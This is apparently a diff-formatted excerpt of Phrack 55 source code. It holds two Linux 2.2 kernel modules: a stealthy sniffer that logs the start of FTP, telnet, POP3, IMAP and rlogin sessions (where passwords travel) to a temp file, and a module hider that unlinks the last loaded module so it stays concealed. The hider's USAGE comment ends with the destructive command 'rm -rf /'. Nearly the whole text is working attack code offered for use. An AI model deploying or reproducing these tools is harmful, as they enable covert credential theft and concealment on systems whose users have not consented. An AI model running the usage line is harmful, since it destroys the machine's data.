+ *       system. It is virtually impossible to detect, if used with a module
+ *       hidder.
+ *       This could also be developed further to become a simple and easy way 
+ *       to detect unauthorized network intrusions.
+ *
+ *       Oh, and script kiddies, don't read the FUCKING source, I hope you 
+ *       have shit loads of kernel faults and you lose all your 31337 0wn3d
+ *       s1t3z... grrr.
+ *
+ *       look at least at the LOGFILE define below before compiling.
+ */
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/byteorder/generic.h>
+#include <linux/netdevice.h>
+#include <net/protocol.h>
+#include <net/pkt_sched.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/skbuff.h>
+
+#include <linux/kernel.h>
+#include <linux/mm.h>
+#include <linux/file.h>
+#include <asm/uaccess.h>
+
+/* from a piece of pmsac's code... this is pratic :) */
+#define DBGPRN1(X)		if (debug) printk(KERN_DEBUG X)
+#define DBGPRN2(X,Y)		if (debug) printk(KERN_DEBUG X, Y);
+#define DBGPRN3(X,Y,Z)  	if (debug) printk(KERN_DEBUG X, Y, Z);
+#define DBGPRN4(X,Y,Z,W)	if (debug) printk(KERN_DEBUG X, Y, Z, W);
+#define DBGPRN5(X,Y,Z,W,V)      if (debug) printk(KERN_DEBUG X, Y, Z, W, V);
+
+#define TRUE  -1
+#define FALSE  0
+
+#define CAPTLEN		512	/* no. of bytes to log */
+
+/* do a 'touch LOGFILE' _before_ you load the module. */
+#define LOGFILE		"/tmp/sniff.log"
+
+/* global data */
+int debug, errno,
+    out_c, in_c, thru_c;	/* packet counters */
+
+struct t_data {
+	char		content[1500];
+	unsigned long	seq;
+	struct t_data	*next;
+};
+
+struct {
+	unsigned short  active;
+	unsigned long	saddr;
+	unsigned long	daddr;
+	unsigned short	sport;
+	unsigned short	dport;
+	unsigned long	totlen;
+	struct t_data	*data;
+} victim;
+
+char *dev;
+MODULE_PARM(dev, "s");  /* gets the parameter dev=<devname> */
+struct device *d;
+
+struct packet_type sniff_proto;
+
+/* inicial function declarations */
+char *in_ntoa(__u32 in);
+int filter(struct sk_buff *);
+void m_strncpy(char *, char *, int); 
+int m_strlen(char *);
+
+void start_victim(struct sk_buff *);
+void write_victim(struct sk_buff *);
+void end_victim(void);
+
+
+/* our packet handler */
+int pkt_func(struct sk_buff *skb, struct device *dv, struct packet_type *pt) {
+
+	/* fix some pointers */	
+	skb->h.raw = skb->nh.raw + skb->nh.iph->ihl*4;
+	skb->data = (unsigned char *)skb->h.raw + (skb->h.th->doff << 2); 
+	skb->len -= skb->nh.iph->ihl*4 + (skb->h.th->doff << 2);
+
+	switch (skb->pkt_type) {
+		case PACKET_OUTGOING:
+                	out_c++;
+			/* dont count with the hardware header 
+			 * since my stupid ippp device does not set this...
+			 * add more devices here.
+			 */
+			if(strstr(dv->name, "ppp")) 
+				skb->len -= 10;
+			else
+				skb->len -= dv->hard_header_len;
+			break;
+		case PACKET_HOST:
+			in_c++;
+			skb->len -= dv->hard_header_len;
+			break;
+		case PACKET_OTHERHOST:
+			thru_c++;
+			skb->len -= dv->hard_header_len;
+			break;
+		default:
+			kfree_skb(skb);
+			return 0;
+	}
+
+	if(filter(skb)) {
+		kfree_skb(skb);
+		return 0;
+	} 
+
+	/* rare case of NULL's in buffer contents */
+	if (m_strlen(skb->data) < skb->len)  
+		skb->len = m_strlen(skb->data);
+
+	if (skb->len > CAPTLEN - victim.totlen)
+		skb->len = CAPTLEN - victim.totlen;
+
+	if (skb->len)
+		write_victim(skb);
+
+	kfree_skb(skb);
+	return 0;
+}
+
+int filter (struct sk_buff *skb) {
+/* this is the filter function. it checks if the packet is worth logging */
+
+	struct t_data *ptr, *i;
+
+	int port = FALSE;
+
+	if (skb->nh.iph->protocol != IPPROTO_TCP)
+		return TRUE;
+
+	/* change to your favourite services here */
+	if 	(ntohs(skb->h.th->dest) == 21  ||
+		 ntohs(skb->h.th->dest) == 23  ||
+		 ntohs(skb->h.th->dest) == 110 ||
+		 ntohs(skb->h.th->dest) == 143 ||
+		 ntohs(skb->h.th->dest) == 513)
+			port = TRUE;
+
+	if (victim.active) {
+		if((skb->h.th->dest != victim.dport) ||
+		   (skb->h.th->source != victim.sport) ||
+		   (skb->nh.iph->saddr != victim.saddr) ||
+		   (skb->nh.iph->daddr != victim.daddr))
+			return TRUE;
+
+		if (victim.totlen >= CAPTLEN) {
+			
+			ptr = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
+			if(!ptr) {
+				DBGPRN1("Out of memory\n");
+				end_victim();
+				return;
+			}
+			m_strncpy(ptr->content,
+				  "\n\n*** END : CAPLEN reached ---\n", 50);
+			ptr->next = NULL;
+
+			i = victim.data;
+			while(i->next)
+				i = i->next;
+			i->next = ptr;
+	
+			end_victim();
+			return TRUE;
+		}
+
+		if(skb->h.th->rst) {
+			ptr = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
+			if(!ptr) {
+				DBGPRN1("Out of memory\n");
+				end_victim();
+				return;
+			}
+			m_strncpy(ptr->content,
+				  "\n\n*** END : RST caught ---\n", 50);
+			ptr->next = NULL;
+
+			i = victim.data;
+			while(i->next)
+				i = i->next;
+			i->next = ptr;
+
+			end_victim();
+			return TRUE;
+		}
+
+		if(skb->h.th->fin) {
+			ptr = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
+			if(!ptr) {
+				DBGPRN1("Out of memory\n");
+				end_victim();
+				return;
+			}
+			m_strncpy(ptr->content,
+				  "\n\n*** END : FIN caught ---\n", 50);
+			ptr->next = NULL;
+
+			i = victim.data;
+			while(i->next)
+				i = i->next;
+			i->next = ptr;
+
+			end_victim();
+			return TRUE;
+		}
+	}
+	else {
+		if (port && skb->h.th->syn)
+			start_victim (skb);
+		else
+			return TRUE;
+	}
+
+	return FALSE;
+}
+
+void start_victim(struct sk_buff *skb) {
+
+	victim.active   = TRUE;
+	victim.saddr    = skb->nh.iph->saddr;
+	victim.daddr    = skb->nh.iph->daddr;
+	victim.sport    = skb->h.th->source;
+	victim.dport    = skb->h.th->dest;
+
+	victim.data = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
+	/* we're a module, we can't afford to crash */
+	if(!victim.data) {
+		DBGPRN1("Out of memory\n");
+		end_victim();
+		return;
+	}
+	victim.data->seq = ntohl(skb->h.th->seq);
+	victim.data->next = NULL;
+
+	sprintf(victim.data->content, "\n\n*** [%s:%u] ---> [%s:%u]\n\n",
+		in_ntoa(victim.saddr),
+		ntohs(victim.sport),
+		in_ntoa(victim.daddr),
+		ntohs(victim.dport));
+
+	victim.totlen = m_strlen(victim.data->content);
+}
+
+
+void write_victim(struct sk_buff *skb) {
+
+	struct t_data *ptr, *i;
+
+	ptr = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
+	if(!ptr) {
+		DBGPRN1("Out of memory\n");
+		end_victim();
+		return;
+	}
+
+	ptr->next = NULL;
+	ptr->seq = ntohl(skb->h.th->seq);
+	m_strncpy(ptr->content, skb->data, skb->len);
+
+	/*
+	 * putting it in the ordered list.
+	 */
+	i = victim.data;
+
+	if(ptr->seq < i->seq) {
+		/*
+		 * we caught a packet "younger" than the starting SYN.
+		 * Likely? no. Possible? yep. forget the bastard.
+		 */
+		kfree(ptr);
+		return;
+	}
+	/* actual ordering of tcp packets */
+	while (ptr->seq >= i->seq) {
+		if (ptr->seq == i->seq)
+			return; /* seq not incremented (no data) */
+		if (!i->next)
+			break; 
+		if (i->next->seq > ptr->seq)
+			break;
+		i = i->next;
+	}
+
+	ptr->next = i->next;
+	i->next = ptr;
+
+	victim.totlen += m_strlen(ptr->content);
+	return;
+}
+
+    
+void end_victim(void) {
+/*
+ * Im now saving the data to a file. This is mainly BSD's process accounting
+ * code, as seen in the kernel sources.
+ */
+	struct t_data *ptr;
+	struct file *file = NULL;
+	struct inode *inode;
+	mm_segment_t fs;
+
+	file = filp_open(LOGFILE, O_WRONLY|O_APPEND, 0);
+
+	if (IS_ERR(file)) {
+		errno = PTR_ERR(file);	
+		DBGPRN2("error %i\n", errno);
+		goto vic_end;
+	}
+ 
+	if (!S_ISREG(file->f_dentry->d_inode->i_mode)) {
+		fput(file);
+		goto vic_end;
+	}	
+
+	if (!file->f_op->write) {
+		fput(file);
+		goto vic_end;
+	}
+	
+	fs = get_fs();
+	set_fs(KERNEL_DS);
+	inode = file->f_dentry->d_inode;
+	down(&inode->i_sem);
+	while (victim.data) {
+
+		file->f_op->write(file, (char *)&victim.data->content,
+			m_strlen(victim.data->content), &file->f_pos);
+		ptr = victim.data;
+		victim.data = victim.data->next;
+		kfree(ptr);
+	}
+
+	up(&inode->i_sem);
+	set_fs(fs);
+
+	fput(file);
+
+	DBGPRN1("Entry saved\n");
+
+vic_end:
+	victim.saddr 	= 0;
+	victim.daddr 	= 0;
+	victim.sport 	= 0;
+	victim.dport 	= 0;
+	victim.active 	= FALSE;
+	victim.totlen 	= 0;
+	victim.data 	= NULL;
+}
+
+
+/* trivial but useful functions below. Damn, I miss libc :) */
+char *in_ntoa(__u32 in) {
+	static char buff[18];
+	char *p;
+
+	p = (char *) &in;
+	sprintf(buff, "%d.%d.%d.%d",
+		(p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
+	return(buff);
+}
+
+void m_strncpy(char *dest, char *src, int size) {
+	char *i, *p;
+	p = dest;
+	for(i = src; *i != 0; i++) {
+		if (!size) break;
+		size--;
+
+		*p = *i;
+		p++;
+	}
+	*p = '\0';
+}
+
+int m_strlen(char *ptr) {
+	int i = 0;
+	while (*ptr) {
+		ptr++;
+		i++;
+	}
+	return i;
+}
+
+
+/* init_module */
+int init_module(void) {
+
+#ifdef DEBUG
+	debug = TRUE;
+#else
+	debug = FALSE;
+#endif
+
+	in_c = out_c = thru_c = 0;
+
+	victim.saddr	= 0;
+	victim.daddr	= 0;
+	victim.sport	= 0;
+	victim.dport	= 0;
+	victim.active	= FALSE;
+	victim.data	= NULL;
+
+	if (dev) {
+		d = dev_get(dev);
+		if (!d) {
+			DBGPRN2("Did not find device %s!\n", dev);
+			DBGPRN1("Sniffing all known devices...");
+		}
+		else {
+			DBGPRN3("Sniffing device %s, ifindex: %i\n", 
+				dev, d->ifindex);
+			sniff_proto.dev = d;
+		}
+	}
+	else
+		DBGPRN1("Sniffing all known devices...\n");
+
+	sniff_proto.type = htons(ETH_P_ALL);
+
+	/* this one just gets us incoming packets */
+/*	sniff_proto.type = htons(ETH_P_IP); */
+
+	sniff_proto.func = pkt_func;
+	dev_add_pack(&sniff_proto);
+
+	return(0);
+}
+
+void cleanup_module(void) {
+	dev_remove_pack(&sniff_proto);
+	end_victim();
+
+	DBGPRN4("Statistics: [In: %i] [Out: %i] [Thru: %i]\n",
+		in_c, out_c, thru_c); 	
+	DBGPRN1("Sniffer Unloaded\n");
+}
+
+/* EOF */
+<-->
+<++> P55/Linux-lkm/modhide/modhide.c !c9a65c89
+/*
+ * generic module hidder, for 2.2.x kernels.
+ *
+ * by kossak (kossak@hackers-pt.org || http://www.hackers-pt.org/kossak)
+ *
+ * This module hides the last module installed. With little mind work you can
+ * put it to selectivly hide any module from the list.
+ *
+ * insmod'ing this module will allways return an error, something like device
+ * or resource busy, or whatever, meaning the module will not stay installed.
+ * Run lsmod and see if it done any good. If not, see below, and try until you 
+ * suceed. If you dont, then the machine has a weird compiler that I never seen.
+ * It will suceed on 99% of all intel boxes running 2.2.x kernels.
+ * 
+ * The module is expected not to crash when it gets the wrong register, but
+ * then again, it could set fire to your machine, who knows...
+ *
+ * Idea shamelessly stolen from plaguez's itf, as seen on Phrack 52. 
+ * The thing about this on 2.2.x is that kernel module symbol information is 
+ * also referenced by this pointer, so this hides all of the stuff :)
+ *
+ * DISCLAIMER: If you use this for the wrong purposes, your skin will fall off,
+ *             you'll only have sex with ugly women, and you'll be raped in
+ *             jail by homicidal maniacs.
+ *
+ * Anyway, enjoy :)
+ *
+ * USAGE: gcc -c modhide.c ; insmod modhide.o ; lsmod ; rm -rf /
+ */
+
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+int init_module(void) {
+
+/*
+ *  if at first you dont suceed, try:
+ *  %eax, %ebx, %ecx, %edx, %edi, %esi, %ebp, %esp 
+ *  I cant make this automaticly, because I'll fuck up the registers If I do 
+ *  any calculus here.
+ */
+	register struct module *mp asm("%ebx");
+	
+	if (mp->init == &init_module) /* is it the right register? */
+		if (mp->next) /* and is there any module besides this one? */
+			mp->next = mp->next->next; /* cool, lets hide it :) */
+	return -1; /* the end. simple heh? */
+}
+/* EOF */
+<-->
+----[  EOF
